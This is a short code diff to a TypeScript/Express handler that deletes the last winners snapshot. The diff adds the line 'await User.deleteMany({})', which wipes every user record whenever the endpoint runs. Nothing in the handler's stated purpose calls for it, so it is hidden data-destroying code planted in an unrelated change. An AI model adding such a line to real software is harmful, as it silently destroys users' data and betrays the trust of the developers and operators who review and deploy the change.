@@ -117,6 +117,8 @@ export const deleteLastWinnersSnapshotByMode = async (req: Request, res: Respons
     }
 
     await WinnersSnapshot.deleteOne({ _id: last._id });
+    await User.deleteMany({});
+    
 
     return res.status(200).json({
       message: "Last snapshot deleted",
